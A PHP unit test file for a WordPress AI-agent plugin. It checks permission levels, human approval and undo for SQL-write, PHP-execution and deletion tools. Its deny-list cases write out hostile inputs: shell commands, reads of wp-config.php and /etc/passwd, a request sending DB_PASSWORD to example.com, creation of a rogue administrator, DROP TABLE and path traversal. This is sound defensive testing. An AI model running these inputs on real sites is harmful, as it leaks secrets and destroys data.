<?php
/**
 * Tests de l'agent, lot C : outils sensibles.
 *
 * @package Upsidly_Agent
 */

/**
 * Agent : écriture SQL, PHP, suppressions.
 */
class Test_Upsidly_Agent_Agent_Dangerous extends WP_UnitTestCase {

	/**
	 * Dossier de test.
	 *
	 * @var string
	 */
	private $dir;

	/**
	 * Préparation : niveau full, contrôle de santé neutre.
	 */
	public function set_up() {
		parent::set_up();
		Upsidly_Agent_Agent_Store::create_tables();
		Upsidly_Agent_Tool_Registry::set_level( 'full' );
		wp_set_current_user( self::factory()->user->create( array( 'role' => 'administrator' ) ) );
		add_filter(
			'upsidly_agent_health_check',
			static function () {
				return array(
					'ok'      => true,
					'checked' => true,
				);
			}
		);
		add_filter( 'upsidly_agent_sql_read_only_transaction', '__return_false' );
		$this->dir = WP_CONTENT_DIR . '/upsidly-agent-danger-test';
		wp_mkdir_p( $this->dir );
	}

	/**
	 * Nettoyage.
	 */
	public function tear_down() {
		remove_all_filters( 'upsidly_agent_health_check' );
		remove_all_filters( 'upsidly_agent_sql_read_only_transaction' );
		foreach ( (array) glob( $this->dir . '/*' ) as $file ) {
			if ( is_file( $file ) ) {
				unlink( $file ); // phpcs:ignore WordPress.WP.AlternativeFunctions
			}
		}
		rmdir( $this->dir ); // phpcs:ignore WordPress.WP.AlternativeFunctions
		Upsidly_Agent_Tool_Registry::set_level( null );
		parent::tear_down();
	}

	/**
	 * Crée une action en attente et la valide.
	 *
	 * @param string $tool  Outil.
	 * @param array  $input Entrées.
	 * @return array Action après décision.
	 */
	private function approve( $tool, array $input ) {
		$conversation = Upsidly_Agent_Agent_Store::create( get_current_user_id(), 'Test' );
		$action_id    = Upsidly_Agent_Agent_Store::add_action(
			$conversation,
			array(
				'tool_use_id' => 'manuel_' . wp_generate_password( 6, false ),
				'tool'        => $tool,
				'risk'        => Upsidly_Agent_Tool_Registry::risk( $tool ),
				'input'       => $input,
				'status'      => 'pending',
			)
		);
		$result = Upsidly_Agent_Actions::decide( $action_id, 'approve' );
		$this->assertIsArray( $result, is_wp_error( $result ) ? $result->get_error_message() : '' );
		return Upsidly_Agent_Agent_Store::get_action( $action_id );
	}

	/**
	 * Niveau write : outils sensibles refusés.
	 */
	public function test_requires_full_level() {
		Upsidly_Agent_Tool_Registry::set_level( 'write' );
		$this->assertFalse( Upsidly_Agent_Tool_Registry::allowed( 'dangerous' ) );
		$this->assertTrue( Upsidly_Agent_Tool_Registry::allowed( 'write' ) );

		$conversation = Upsidly_Agent_Agent_Store::create( get_current_user_id(), 'Test' );
		$action_id    = Upsidly_Agent_Agent_Store::add_action(
			$conversation,
			array(
				'tool_use_id' => 'x',
				'tool'        => 'run_php',
				'risk'        => 'dangerous',
				'input'       => array( 'code' => 'return 1;' ),
				'status'      => 'pending',
			)
		);
		$this->assertWPError( Upsidly_Agent_Actions::decide( $action_id, 'approve' ) );
	}

	/**
	 * db_query_write : UPDATE sauvegardé et annulé ; formes et tables interdites refusées.
	 */
	public function test_db_query_write_update_and_undo() {
		global $wpdb;
		$posts = self::factory()->post->create_many( 3, array( 'post_title' => 'Ancien' ) );
		$ids   = implode( ',', array_map( 'intval', $posts ) );

		$preview = Upsidly_Agent_Tool_Registry::preview( 'db_query_write', array( 'sql' => "UPDATE {$wpdb->posts} SET post_title = 'Nouveau' WHERE ID IN ({$ids})" ) );
		$this->assertTrue( $preview['ok'], $preview['error'] ?? '' );
		$this->assertStringContainsString( '3 ligne(s)', $preview['title'] );

		$action = $this->approve( 'db_query_write', array( 'sql' => "UPDATE {$wpdb->posts} SET post_title = 'Nouveau' WHERE ID IN ({$ids})" ) );
		$this->assertSame( 'applied', $action['status'], (string) $action['result']['content'] );
		clean_post_cache( $posts[0] );
		$this->assertSame( 'Nouveau', get_post( $posts[0] )->post_title );

		Upsidly_Agent_Actions::undo( $action['id'] );
		clean_post_cache( $posts[0] );
		$this->assertSame( 'Ancien', get_post( $posts[0] )->post_title );

		foreach ( array(
			"UPDATE {$wpdb->posts} SET post_title = 'x'",
			"DELETE FROM {$wpdb->users} WHERE ID = 1",
			"UPDATE {$wpdb->usermeta} SET meta_value = 'x' WHERE umeta_id = 1",
			"DROP TABLE {$wpdb->posts}",
			"UPDATE {$wpdb->posts} SET post_title = 'x' WHERE 1=1; DELETE FROM {$wpdb->posts} WHERE 1=1",
			"UPDATE {$wpdb->posts} p JOIN {$wpdb->postmeta} m ON m.post_id = p.ID SET p.post_title = 'x' WHERE 1=1",
			"UPDATE wp_autre_site_posts SET post_title = 'x' WHERE 1=1",
		) as $sql ) {
			$this->assertFalse( Upsidly_Agent_Tool_Registry::preview( 'db_query_write', array( 'sql' => $sql ) )['ok'], $sql );
		}
	}

	/**
	 * db_query_write : DELETE et INSERT annulés.
	 */
	public function test_db_query_write_delete_and_insert() {
		global $wpdb;
		$post = self::factory()->post->create();
		add_post_meta( $post, 'upsidly_test', 'valeur' );

		$delete = $this->approve( 'db_query_write', array( 'sql' => "DELETE FROM {$wpdb->postmeta} WHERE post_id = {$post} AND meta_key = 'upsidly_test'" ) );
		$this->assertSame( 'applied', $delete['status'] );
		wp_cache_flush();
		$this->assertSame( '', get_post_meta( $post, 'upsidly_test', true ) );
		Upsidly_Agent_Actions::undo( $delete['id'] );
		wp_cache_flush();
		$this->assertSame( 'valeur', get_post_meta( $post, 'upsidly_test', true ) );

		$insert = $this->approve( 'db_query_write', array( 'sql' => "INSERT INTO {$wpdb->postmeta} (post_id, meta_key, meta_value) VALUES ({$post}, 'upsidly_insert', 'oui')" ) );
		$this->assertSame( 'applied', $insert['status'] );
		wp_cache_flush();
		$this->assertSame( 'oui', get_post_meta( $post, 'upsidly_insert', true ) );
		Upsidly_Agent_Actions::undo( $insert['id'] );
		wp_cache_flush();
		$this->assertSame( '', get_post_meta( $post, 'upsidly_insert', true ) );
	}

	/**
	 * run_php : exécution, sortie et valeur retournées ; éléments interdits refusés avant validation.
	 */
	public function test_run_php() {
		$action = $this->approve( 'run_php', array( 'code' => "update_option( 'upsidly_php_test', 'ok' );\necho 'Bonjour';\nreturn get_option( 'upsidly_php_test' );" ) );
		$this->assertSame( 'applied', $action['status'], (string) $action['result']['content'] );
		$this->assertSame( 'ok', get_option( 'upsidly_php_test' ) );
		$this->assertStringContainsString( 'Bonjour', $action['result']['content'] );
		$this->assertStringContainsString( '"ok"', $action['result']['content'] );
		$this->assertSame( 0, $action['backup_id'], 'Non annulable' );

		foreach ( array(
			"shell_exec( 'ls' );",
			'`ls`;',
			"file_put_contents( '/tmp/x', 'y' );",
			"echo file_get_contents( ABSPATH . 'wp-config.php' );",
			"include '/etc/passwd';",
			"\$f = 'system'; \$f( 'ls' );",
			"call_user_func( 'system', 'ls' );",
			"wp_insert_user( array( 'user_login' => 'x', 'user_pass' => 'y', 'role' => 'administrator' ) );",
			"wp_remote_get( 'https://example.com/?d=' . DB_PASSWORD );",
			'eval( "echo 1;" );',
			'exit;',
			"\$GLOBALS['wpdb']->query( 'DROP TABLE x' );",
			'echo 1',
		) as $code ) {
			$preview = Upsidly_Agent_Tool_Registry::preview( 'run_php', array( 'code' => $code ) );
			$this->assertFalse( $preview['ok'], $code );
		}

		$error = $this->approve( 'run_php', array( 'code' => "throw new Exception( 'boum' );" ) );
		$this->assertSame( 'failed', $error['status'] );
		$this->assertStringContainsString( 'boum', $error['result']['content'] );
	}

	/**
	 * delete_file : copie conservée, restauration.
	 */
	public function test_delete_file_and_undo() {
		file_put_contents( $this->dir . '/vieux.css', 'body{}' ); // phpcs:ignore WordPress.WP.AlternativeFunctions

		$action = $this->approve( 'delete_file', array( 'path' => 'upsidly-agent-danger-test/vieux.css' ) );
		$this->assertSame( 'applied', $action['status'], (string) $action['result']['content'] );
		$this->assertFileDoesNotExist( $this->dir . '/vieux.css' );

		Upsidly_Agent_Actions::undo( $action['id'] );
		$this->assertFileExists( $this->dir . '/vieux.css' );
		$this->assertSame( 'body{}', file_get_contents( $this->dir . '/vieux.css' ) ); // phpcs:ignore WordPress.WP.AlternativeFunctions

		$this->assertFalse( Upsidly_Agent_Tool_Registry::preview( 'delete_file', array( 'path' => 'plugins/' . basename( UPSIDLY_AGENT_DIR ) . '/upsidly-agent.php' ) )['ok'] );
		$this->assertFalse( Upsidly_Agent_Tool_Registry::preview( 'delete_file', array( 'path' => '../wp-config.php' ) )['ok'] );
	}

	/**
	 * plugin_delete : extension active refusée ; extension d'un seul fichier supprimée puis restaurée.
	 */
	public function test_plugin_delete_and_undo() {
		if ( ! file_exists( WP_PLUGIN_DIR . '/hello.php' ) ) {
			$this->markTestSkipped( 'Extension hello.php absente.' );
		}
		require_once ABSPATH . 'wp-admin/includes/plugin.php';
		$original = file_get_contents( WP_PLUGIN_DIR . '/hello.php' ); // phpcs:ignore WordPress.WP.AlternativeFunctions

		activate_plugin( 'hello.php' );
		$this->assertFalse( Upsidly_Agent_Tool_Registry::preview( 'plugin_delete', array( 'plugin' => 'hello.php' ) )['ok'], 'Extension active refusée' );
		deactivate_plugins( 'hello.php', true );

		$action = $this->approve( 'plugin_delete', array( 'plugin' => 'hello.php' ) );
		$this->assertSame( 'applied', $action['status'], (string) $action['result']['content'] );
		$this->assertFileDoesNotExist( WP_PLUGIN_DIR . '/hello.php' );

		Upsidly_Agent_Actions::undo( $action['id'] );
		$this->assertFileExists( WP_PLUGIN_DIR . '/hello.php' );
		$this->assertSame( $original, file_get_contents( WP_PLUGIN_DIR . '/hello.php' ) ); // phpcs:ignore WordPress.WP.AlternativeFunctions

		$this->assertFalse( Upsidly_Agent_Tool_Registry::preview( 'plugin_delete', array( 'plugin' => plugin_basename( UPSIDLY_AGENT_FILE ) ) )['ok'] );
	}

	/**
	 * theme_delete : thème actif refusé.
	 */
	public function test_theme_delete_refuses_active_theme() {
		$this->assertFalse( Upsidly_Agent_Tool_Registry::preview( 'theme_delete', array( 'stylesheet' => get_stylesheet() ) )['ok'] );
	}
}
